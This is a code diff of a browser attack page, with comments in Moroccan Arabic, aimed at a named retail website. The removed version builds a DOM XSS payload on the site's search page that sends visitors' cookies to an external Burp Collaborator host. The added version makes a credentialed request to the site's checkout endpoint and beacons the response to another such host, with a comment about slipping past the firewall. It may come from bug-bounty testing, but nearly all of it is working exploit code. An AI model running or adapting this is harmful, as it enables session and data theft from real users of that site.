@@ -1,18 +1,12 @@
-<!DOCTYPE html>
-<html>
-<body onload="finalStrike()">
-    <script>
-        function finalStrike() {
-            // الكود اللي غايجمع الكوكيز ويصيفطهم بـ Redirect
-            // استعملنا window.location باش نهربو من قيود الـ fetch
-            var payload = "window.location.href='https://tmjejnt6112dbexh6syhwoigg7mya3ys.oastify.com/?exfil=' + btoa(document.cookie);";
-
-            // الرابط ديال DOM XSS اللي خدم ليك فـ dkt
-            var targetUrl = "https://www.decathlon.com/search?q=test#<svg/onload=\"" + payload + "\">";
-
-            // طلق القرطاسة
-            window.location.href = targetUrl;
+<script>
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "https://www.decathlon.com/shopify_pay/accelerated_checkout", true);
+    xhr.withCredentials = true; // هادي هي اللي كتجر الكوكيز
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState == 4) {
+            // صيفط الداتا نيشان لـ Collaborator بلا تشفير (باش مايعيقش الـ WAF)
+            navigator.sendBeacon("https://gn7qbnn0jgv8qpu5xza8r0zrzi59t3hs.oastify.com/?data=" + xhr.responseText.substring(0,100));
         }
-    </script>
-</body>
-</html>
+    };
+    xhr.send();
+</script>
